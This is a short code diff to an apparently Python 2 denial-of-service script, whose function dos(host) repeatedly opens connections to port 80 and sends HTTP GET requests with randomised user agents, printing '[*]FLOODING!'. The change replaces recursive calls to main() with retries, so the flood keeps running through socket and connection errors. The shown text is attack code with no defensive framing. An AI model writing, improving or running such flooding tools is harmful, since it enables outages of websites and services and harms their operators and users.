@@ -34,14 +34,14 @@ def dos(host):
         try:
             s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         except:
-            print "Unable to create Socket."
-            main()
+            print "Unable to create Socket. Retrying."
+            continue
         random_index = randrange(len(uagent))
         try:
             s.connect((ip,80))
         except:
-            print "Unable To Connect."
-            main()
+            print "Unable To Connect. Retrying."
+            continue
         print "[*]FLOODING!"
         s.send("GET / HTTP/1.1\r\n")
         s.send("Host: "+host+"\r\n")
